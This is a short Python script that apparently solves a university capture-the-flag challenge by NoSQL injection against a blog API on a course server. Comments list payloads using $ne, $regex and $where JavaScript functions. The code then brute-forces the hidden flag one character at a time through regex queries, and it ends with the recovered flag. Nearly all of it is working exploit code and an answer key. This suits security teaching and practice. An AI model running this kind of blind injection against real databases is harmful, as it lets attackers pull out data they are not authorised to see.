import requests
# gets posts from another url, port 9013, not monolithic
# js on 9012 filters out flags, get directly from 9013

# blogger Js will prepend "?title=" to our query, can bypass with burpsuite, anything cleaner tho?
# ?title= &title[$ne]=manifesto
# ?title= &flag[$regex]=(CSCE604258)
# function() { obj.flag = false; return obj; }
# ?title= &content[$regex]=(underachiever)
# ?title= &$where="this.flag == false"

# $where=function() { if (obj.title == 'test') {var newpost = new Object(); newpost.title = "hi"; newpost.content = "hello"; return newpost} }
# $where=function() {if (obj.title == 'test'){console.log("it works now.");}}
url = 'http://ctf99.cs.ui.ac.id:9013/api/posts'
flag_bruteforce = ""

import re
import string
while True:
    ran_out = True
    for char in string.printable:
        char = re.escape(char)
        try_string = flag_bruteforce + char
        params = {
            'flag[$regex]': ".*CSCE604258{" + try_string + ".*" + "}"
        }
        response = requests.get(url, params)
        if "flag" in response.text:
            flag_bruteforce = try_string
            print(flag_bruteforce)
            ran_out = False
    if ran_out:
        break
print(f"CSCE604258{{{flag_bruteforce}}}") # CSCE604258{GainfR0mn0SQL}
